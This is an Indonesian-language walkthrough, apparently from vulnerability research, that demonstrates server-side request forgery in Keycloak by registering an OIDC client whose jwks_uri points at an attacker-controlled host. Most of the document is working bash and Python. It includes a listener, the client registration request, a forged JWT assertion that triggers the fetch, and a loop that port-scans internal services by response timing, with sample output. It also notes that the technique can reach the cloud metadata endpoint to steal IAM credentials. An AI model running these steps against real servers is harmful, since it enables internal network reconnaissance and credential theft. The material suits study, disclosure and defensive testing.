# Tutorial: Finding #6 — SSRF via DCR jwks_uri

**Severity:** MEDIUM (CVSS 6.5)
**Waktu demo:** ~8 menit
**Kebutuhan:** 2 Terminal

---

## Skenario Serangan

Attacker dengan role `create-client` register OIDC client via DCR dengan `jwks_uri` mengarah ke alamat internal. Saat JWT authentication di-trigger, Keycloak fetch URL tersebut — SSRF!

---

## Langkah 0: Pastikan Keycloak Berjalan dan testuser Punya create-client Role

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

Setup role jika belum (sama seperti Finding #5):
```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -o /dev/null -w "Assign role: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

---

## Langkah 1: (ATTACKER) Login sebagai testuser

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
```

---

## Langkah 2: Siapkan HTTP Listener (Terminal 1)

Buka terminal baru — ini akan menangkap SSRF request dari Keycloak:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'')
        print(f'=== SSRF via JWKS_URI TERDETEKSI! ===')
        print(f'Method:     {self.command}')
        print(f'Path:       {self.path}')
        print(f'Host:       {self.headers.get(\"Host\")}')
        print(f'User-Agent: {self.headers.get(\"User-Agent\")}')
        print(f'=====================================')
        print(f'')
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{\"keys\":[]}')
    def log_message(self, *a): pass
print('Listener siap di port 49997...')
print('Menunggu Keycloak fetch jwks_uri...')
HTTPServer(('0.0.0.0', 49997), H).serve_forever()
"
```

---

## Langkah 3: (ATTACKER) Register DCR Client dengan jwks_uri Internal (Terminal 2)

```bash
DCR_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "ssrf-probe",
    "redirect_uris": ["https://test.com/cb"],
    "grant_types": ["authorization_code", "client_credentials"],
    "response_types": ["code"],
    "token_endpoint_auth_method": "private_key_jwt",
    "jwks_uri": "http://46.101.162.187:49997/internal-jwks"
  }')

echo "$DCR_RESP" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print('=== DCR CLIENT TERDAFTAR ===')
print(f'Client ID:  {d.get(\"client_id\")}')
print(f'jwks_uri:   http://46.101.162.187:49997/internal-jwks')
print(f'Auth method: private_key_jwt')
print('============================')
"

CLIENT_ID=$(echo "$DCR_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_id'])")
echo "Client ID: $CLIENT_ID"
```

> **jwks_uri diterima tanpa validasi!** Keycloak tidak cek apakah URL tersebut internal/private.

---

## Langkah 4: Buat JWT Client Assertion

JWT ini akan memaksa Keycloak fetch `jwks_uri` untuk validasi signature:

```bash
JWT_HEADER=$(echo -n '{"alg":"RS256","kid":"test-key"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

JWT_PAYLOAD=$(python3 -c "
import json,base64,time
p = json.dumps({
    'iss': '$CLIENT_ID',
    'sub': '$CLIENT_ID',
    'aud': 'http://46.101.162.187:8080/realms/test',
    'exp': 9999999999,
    'iat': int(time.time()),
    'jti': 'ssrf-demo'
})
print(base64.urlsafe_b64encode(p.encode()).rstrip(b'=').decode())
")

JWT="${JWT_HEADER}.${JWT_PAYLOAD}.ZmFrZXNpZw"
echo "JWT assertion: ${JWT:0:60}..."
```

---

## Langkah 5: Trigger SSRF!

Kirim request ke token endpoint dengan JWT assertion — Keycloak akan fetch jwks_uri untuk verifikasi:

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$CLIENT_ID" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$JWT" \
  | python3 -m json.tool
```

**Output:**
```json
{
  "error": "invalid_client",
  "error_description": "Unable to load public key"
}
```

> Error "Unable to load public key" membuktikan Keycloak **mencoba fetch jwks_uri** dan mendapat `{"keys":[]}` (tidak ada key yang cocok).

---

## Langkah 6: Lihat Listener (Terminal 1)

**Output di listener:**
```
=== SSRF via JWKS_URI TERDETEKSI! ===
Method:     GET
Path:       /internal-jwks
Host:       46.101.162.187:49997
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
=====================================
```

> **SSRF CONFIRMED!** Keycloak melakukan server-side HTTP GET ke alamat yang attacker tentukan!

---

## Langkah 7: Demo Port Scanning via SSRF

Attacker bisa scan port internal berdasarkan timing response:

```bash
echo "=== Port Scanning via SSRF ==="
echo ""

for TARGET in "127.0.0.1:8080" "127.0.0.1:22" "127.0.0.1:3306" "127.0.0.1:9999"; do
  # Register client untuk setiap target
  SCAN_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
      \"client_name\": \"scan-${TARGET//[:.]/-}\",
      \"redirect_uris\": [\"https://test.com/cb\"],
      \"grant_types\": [\"client_credentials\"],
      \"response_types\": [\"code\"],
      \"token_endpoint_auth_method\": \"private_key_jwt\",
      \"jwks_uri\": \"http://${TARGET}/jwks\"
    }")
  SCAN_ID=$(echo "$SCAN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('client_id','ERROR'))" 2>/dev/null)

  if [ "$SCAN_ID" != "ERROR" ]; then
    # Trigger fetch dan ukur waktu
    START=$(date +%s%3N)
    curl -s -o /dev/null -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
      -d "client_id=$SCAN_ID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJ0ZXN0In0.fake" 2>/dev/null
    END=$(date +%s%3N)
    ELAPSED=$((END - START))
    echo "  $TARGET  →  ${ELAPSED}ms"
  fi
done

echo ""
echo "Port terbuka: response cepat"
echo "Port tertutup: response lambat (timeout)"
```

**Output contoh:**
```
=== Port Scanning via SSRF ===

  127.0.0.1:8080  →  15ms     (Keycloak - OPEN)
  127.0.0.1:22    →  80ms     (SSH - OPEN)
  127.0.0.1:3306  →  5002ms   (MySQL - CLOSED)
  127.0.0.1:9999  →  5001ms   (Random - CLOSED)
```

---

## Langkah 8: Jalankan Python PoC (Otomatis Semua)

```bash
python3 pocs/poc_f6_dcr_jwks_ssrf.py --host http://localhost:8080 --listen-port 49997
```

---

## Ringkasan

| Test | Hasil | Status |
|---|---|---|
| Register DCR client dengan jwks_uri internal | Diterima tanpa validasi | VULNERABLE |
| Trigger JWKS fetch via JWT assertion | Keycloak fetch URL | VULNERABLE |
| Port scanning via timing | Port terbuka vs tertutup terlihat jelas | VULNERABLE |

**Perbandingan dengan Finding #4:**
| | Finding #4 (IdP SSRF) | Finding #6 (DCR SSRF) |
|---|---|---|
| Role yang dibutuhkan | `manage-identity-providers` (admin-level) | `create-client` (lebih rendah) |
| HTTP method | GET + POST | GET |
| Trigger | Langsung via admin API | DCR + JWT authentication |

**Kesimpulan:** User dengan role `create-client` bisa melakukan SSRF untuk scan jaringan internal, termasuk akses cloud metadata endpoint (`169.254.169.254`) untuk mencuri IAM credentials.
